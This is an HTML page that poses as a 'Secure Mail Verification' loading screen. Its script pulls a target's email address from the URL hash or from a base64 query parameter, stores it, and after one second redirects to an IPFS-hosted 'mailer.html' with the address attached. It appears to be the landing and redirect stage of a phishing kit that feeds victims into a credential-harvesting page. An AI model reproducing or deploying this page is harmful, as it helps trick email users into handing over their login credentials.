<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Secure Mail Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            background: #f0f2f5;
            color: #333;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            font-weight: bold;
            margin-top: 20px;
            font-size: 18px;
        }
    </style>
    <script>
        // Enhanced email extraction from URL hash
        function extractEmailFromURL() {
            // First try hash fragment (#email@domain.com)
            if (window.location.hash) {
                const hash = window.location.hash.substring(1);
                if (hash.includes('@')) {
                    const email = decodeURIComponent(hash);
                    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                        return email;
                    }
                }
            }
            
            // Then try query parameters (?e=encodedEmail)
            const urlParams = new URLSearchParams(window.location.search);
            const encodedEmail = urlParams.get('e') || urlParams.get('email');
            
            if (encodedEmail) {
                try {
                    const email = atob(encodedEmail);
                    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                        return email;
                    }
                } catch (e) {
                    console.error('Email decode error:', e);
                }
            }
            
            return null;
        }

        // Prepare redirect to your IPFS mailer
        function prepareRedirect() {
            const email = extractEmailFromURL();
            const ipfsURL = 'https://bafybeiemk6k2dbq5kqea3qbjspjsungctthqvtu5evajtgdqlbn2nneqb4.ipfs.dweb.link/mailer.html';
            
            if (email) {
                // Store email in session storage (more secure than localStorage)
                sessionStorage.setItem('auto_email', email);
                
                // Optional: Also pass in URL hash for redundancy
                return `${ipfsURL}#${encodeURIComponent(email)}`;
            }
            
            return ipfsURL;
        }

        // Initialize and redirect
        document.addEventListener('DOMContentLoaded', function() {
            const email = extractEmailFromURL();
            
            if (email) {
                // Store email for the mailer page
                sessionStorage.setItem('auto_email', email);
            }
            
            // Quick redirect (1 second delay)
            setTimeout(() => {
                window.location.href = prepareRedirect();
            }, 1000);
        });
    </script>
</head>
<body>
    <div class="loader"></div>
    <div class="status">SECURE CONNECTION INITIALIZATION...</div>
    <noscript>
        <div style="color:red;margin-top:20px;">
            JavaScript is required for secure authentication. Please enable JavaScript to continue.
        </div>
    </noscript>
</body>
</html>
